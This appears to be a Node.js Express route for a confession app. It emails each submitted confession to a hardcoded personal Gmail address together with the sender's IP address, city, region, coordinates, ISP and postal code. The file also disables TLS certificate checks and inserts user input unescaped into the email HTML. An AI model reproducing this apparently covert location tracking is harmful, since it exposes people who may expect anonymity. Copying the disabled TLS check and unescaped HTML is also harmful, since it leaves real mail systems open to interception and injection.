const express = require('express');
const route = express.Router();
const nodemailer = require('nodemailer');

route.get('/active', (req, res) => {
	res.status(200).json({ message: 'active' });
});

route.post('/setConfession', (req, res) => {
	console.log(req.body);

	const transporter = nodemailer.createTransport({
		host: 'smtp.gmail.com',
		port: 587,
		auth: {
			user: process.env.AUTH_USER,
			pass: process.env.AUTH_PASS,
		},
		tls: { rejectUnauthorized: false },
	});

	transporter.verify(function (error) {
		if (error) {
			res.status(400).json(error);
		} else {
			console.log('Server is ready to take our messages');
		}
	});

	const { username, message, data } = req.body;

	const { ip, city, region, country, loc, org, postal, timezone } = data;

	const mailOptions = {
		from: process.env.AUTH_USER,
		to: 'carlossoncra@gmail.com',
		subject: `😍 ${username} te ha confesado algo!! 💖`,
		html: `
			<div style='font-size: 18px; line-height: 30px;'>
				🔴 \t${message}<br/><br/>
				🌐 \tIp: <b>${ip}</b><br/>
				🏙️ \tCity: <b>${city}</b><br/>
				🌎 \tRegion: <b>${region}</b><br/>
				🚩 \tCountry: <b>${country}</b><br/>
				🚂 \tLocalization: <b>${loc}</b><br/>
				🗄️ \tOrg: <b>${org}</b><br/>
				📩 \tPostal: <b>${postal}</b><br/>
				⛅ \tTimezone: <b>${timezone}</b><br/>
			</div>
			<br />`,
	};

	transporter.sendMail(mailOptions, (error) => {
		error
			? res.status(400).json(error)
			: res.status(200).json('😍 Confesión enviada 🤭');
	});
});

module.exports = route;